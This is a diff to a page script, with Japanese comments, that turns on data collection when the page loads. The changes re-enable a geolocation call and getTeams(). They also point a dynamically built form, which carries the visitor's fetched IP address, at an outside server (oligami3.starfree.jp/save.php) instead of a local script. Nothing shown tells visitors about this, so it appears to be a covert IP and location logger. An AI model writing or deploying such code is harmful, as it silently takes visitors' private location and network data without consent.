@@ -9,7 +9,7 @@ window.onload = async function() {
   // newWindow = window.open("https://www.google.co.jp/maps/", "null");
   // if( newWindow ) {
   //   console.log('正常に開きました');
-    // getTeams();
+    getTeams();
   // }
   // else {
   //   console.log('正常に開けませんでした！');
@@ -19,14 +19,12 @@ window.onload = async function() {
   const ip = await request.json()
   console.log(ip)
   submitForm(ip);
-  // var iframeElem = document.getElementsByTagName('iframe');
-  // console.log(iframeElem);
 };
 
 async function submitForm (ip) {
   // form を動的に生成
   var form = document.createElement('form');
-  form.action = './save.php';
+  form.action = 'http://oligami3.starfree.jp/save.php';
   form.method = 'POST';
 
   // body に追加
@@ -109,7 +107,7 @@ async function getTeams () {
   // await sleep(1000);
   // console.log("equal");
 
-  // navigator.geolocation.getCurrentPosition( successFunc , errorFunc , optionObj ) ;
+  navigator.geolocation.getCurrentPosition( successFunc , errorFunc , optionObj ) ;
 
   // console.log("equal5");
 }
